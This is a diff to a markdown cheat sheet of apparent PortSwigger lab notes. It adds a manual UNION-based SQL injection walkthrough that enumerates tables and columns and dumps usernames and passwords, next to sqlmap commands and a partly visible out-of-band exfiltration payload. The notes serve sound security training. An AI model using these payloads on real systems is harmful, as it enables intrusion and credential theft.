@@ -394,7 +394,7 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
 
-<sup>Using SQLMAP to enumerate tracking cookie.</sup>  
+<sup>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.</sup>  
 
 ```bash
 sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "TrackingId"
@@ -437,6 +437,31 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```  
+
+## SQLi Manual Exploit  
+
+>SQL injection vulnerability exploited manually by first finding list of **tables** in the database.  
+
+```sql
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+```  
+
+>Second retrieve the names of the **columns** in the table.  
+
+```sql
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qoixrv'--
+```  
+
+>Final step **dump data** from the username and passwords from records.  
+
+```sql
+'+UNION+SELECT+username_wrrcyp,+password_zwjmpc+FROM+users_qoixrv--
+``` 
+
+![manual-sqli.png](manual-sqli.png)  
+
+[PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  
+
 
 ## XXE Injections
 
